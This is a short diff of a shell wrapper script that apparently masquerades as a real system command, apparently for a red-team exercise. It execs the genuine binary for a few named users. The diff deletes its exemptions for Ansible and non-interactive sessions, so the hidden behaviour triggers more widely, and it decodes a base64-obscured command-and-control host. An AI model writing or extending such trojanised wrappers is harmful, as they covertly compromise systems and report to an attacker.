@@ -10,15 +10,7 @@ case "$(whoami)" in
     kingneptune|paintythepirate|greyteamadmin) exec $REAL "$@" ;;
 esac
 
-# Ansible automation bypass — let Ansible run unimpeded
-if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
-    exec $REAL "$@"
-fi
 
-# Script/non-interactive bypass — don't break automated pipelines
-if [ ! -t 0 ] && [ ! -t 1 ]; then
-    exec $REAL "$@"
-fi
 
 C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
 
